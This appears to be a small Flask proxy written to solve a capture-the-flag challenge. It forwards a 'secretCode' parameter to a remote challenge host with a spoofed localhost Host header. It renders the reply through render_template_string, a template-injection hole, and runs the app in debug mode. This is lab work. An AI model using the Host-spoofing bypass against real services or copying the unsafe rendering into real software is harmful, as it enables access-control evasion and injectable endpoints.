

import urllib
import requests
from flask import (
    Flask,
    jsonify,
    request,
    render_template,
    redirect,
    render_template_string
)

app = Flask(__name__)

def get_url(url):
	content = ""
	try:
		with urllib.request.urlopen(url) as response:
			content = response.read()
			if type(content) == bytes:
				try: content = content.decode()
				except: pass
			return content
	except urllib.error.URLError as e:
		content = e.reason
	except Exception as e:
		content = e
	return str(content)



@app.route("/deactivate")
def index():
    success = 'Congratulations you managed to stop the rebelion!'
    wrong = 'Did you really think you could stop us?'

    source = request.args.get('secretCode')
    print(f"this is the source {source}")
    params = {
        "secretCode":source
    }
    value = requests.get(url="http://64.227.39.88:30458/deactivate",params=params, headers={
        "Host":"127.0.0.1:1337"
        })

    
    content = value.text
    if success in content:
        print(success)
    elif wrong in content:
        print(wrong)
    else:
        print("nothing to show :(")
    return render_template_string(content)


if __name__ == "__main__":
    app.run("127.0.0.1", port=1337, debug=True)



